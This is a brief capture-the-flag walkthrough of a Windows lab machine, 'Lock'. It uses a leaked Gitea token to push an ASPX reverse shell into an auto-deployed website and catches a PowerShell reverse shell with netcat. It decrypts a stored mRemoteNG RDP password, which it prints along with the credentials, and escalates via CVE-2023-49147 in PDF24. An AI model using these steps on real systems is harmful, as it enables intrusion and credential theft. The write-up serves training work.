# Lock writeup

##1 nmap  


 ** Internet Information Services (IIS) for Windows® Server is a flexible, secure and manageable Web server for hosting anything on the We.**   

##2 user flag
smbclient -L 10.129.1.218  
doesn't work  
 ** Server Message Block (SMB) is a network communication protocol primarily used for providing shared access to files, printers, and serial ports between nodes on a network**   

visit website, but didnt find anything.  
visit port 3000  
-> gitea is running and get "access token" from commit log!  
download repos.py on our attacking machine, and  
python3 repos.py http://10.129.234.64:3000  
-> we can find "website" repository.  
git clone  
$ http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git  
from readme, the file committed to git  will be deployed to the website automatically  
we know the target server is windows-IIS from nmap result.  
-> try aspx shell!  
$ locate shell | grep aspx  
$ cp {reverse_shell} .  
$ git add reverse_shell  
$ git commit -m "shell"  
$ git push  
visit the http://10.129.234.64/shell.aspx, we can we can execute command  
-> so execute powershell reverse shell command generated on https://www.revshells.com/  
$ nc -nlvp 1234  
->get shell of ellen.freeman  
ellen.freeman) tree /f .  
->no flag, but find config.xml  
with type command, this file seems to be mremoteng's config file.  
 ** Multi-Remote Next Generation (mRemoteNG) is an open source remote connections manager that supports the following protocols: Remote Desktop Protocol (RDP), Virtual Network Computing (VNC), Independent Computing Architecture (ICA), Secure Shell (SSH), Telnet, Hypertext Transfer Protocol/Secure (HTTP/HTTPS) and rlogin. **   
we can find the following information from the config.xml  
user: Gale.Dekarios  
pass: TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==  
protocol: rdp  
password seems to be encrypted, so decrypt the pasword by using mremoteng_decrypt.py script(can find on google)  
Now, got password for Gale.Dekarios and get access via rdp  
$ xfreerdp3 /v:10.129.1.218 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6  
  
[+] get user flag!! [+]  
  
##3 root flag
there is pdf24  
PS C:\Program Files\PDF24> Get-ChildItem .\pdf24.exe | Format-List VersionInfo  
-> the version of pdf24 is 11.15.1,  
we can find CVE-2023-49147 from google search.  
  
send SetOpLock.exe  
-> follow the CVE-2023-49147  
  
[+] get admin priv and root flag!! [+]  
  
